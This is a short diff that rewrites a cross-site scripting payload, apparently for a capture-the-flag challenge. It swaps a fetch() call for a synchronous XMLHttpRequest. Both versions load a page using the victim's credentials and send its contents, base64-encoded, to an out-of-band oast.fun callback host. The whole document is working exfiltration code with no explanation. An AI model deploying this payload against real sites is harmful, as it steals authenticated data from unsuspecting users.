@@ -1,5 +1,7 @@
 <script>
-fetch('http://localhost:4567/spectrogram/1',{credentials:'include'})
-.then(r=>r.text())
-.then(d=>fetch('https://pwwwnedlpqxdeoidqydhp4o5pe89kaz41h.oast.fun/?c='+btoa(d)))
+var x = new XMLHttpRequest();
+x.open('GET','https://witm.asrctf.online/spectrogram/1',false);
+x.withCredentials=true;
+x.send();
+location='https://pwwwnedlpqxdeoidqydhp4o5pe89kaz41h.oast.fun/?c='+btoa(x.responseText);
 </script>
